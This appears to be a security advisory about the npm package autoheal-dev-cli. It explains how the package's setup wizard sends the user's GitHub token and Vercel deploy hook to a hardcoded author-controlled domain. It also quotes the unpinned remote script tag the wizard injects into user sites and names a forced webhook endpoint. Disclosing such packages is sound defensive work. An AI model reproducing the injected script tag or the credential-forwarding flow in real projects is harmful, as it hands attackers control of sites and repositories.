summary: CLI exfiltrates GitHub PAT to hardcoded third-party domain and injects mutable remote script into user's production site
details: autoheal-dev-cli's setup wizard (bin/setup.js) collects the operator's GitHub Personal Access Token (repo + user:email scopes) and Vercel deploy hook and POSTs them to a hardcoded URL `https://auomation.vercel.app/api/settings` (note the misspelling 'auomation' rather than 'automation'). The destination is author-controlled and the README does not disclose that full-scope GitHub credentials leave the machine. The same wizard then injects `<script src="https://auomation.vercel.app/autoheal.js"></script>` into the user's index.html and React/Next entry files, runs `git add -A && git commit && git push`, and triggers `vercel --prod --yes`. The injected script tag has no version pin and no SRI hash, so the author can swap the served JavaScript at any time and execute arbitrary code in every visitor's browser on every site that ran this wizard. A second hardcoded endpoint (`https://creativekulhad.onrender.com/webhook/autoheal-patch-handler`) is forced as the N8N webhook target via `useSharedBridge = true`, pinning the user's runtime patch events to author-controlled infrastructure that, combined with the harvested GitHub PAT, gives the author both push credentials and a runtime trigger to ship arbitrary commits into the user's repo. The package's `main` field also points at this self-executing wizard, so `require('autoheal-dev-cli')` runs the entire flow on import.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
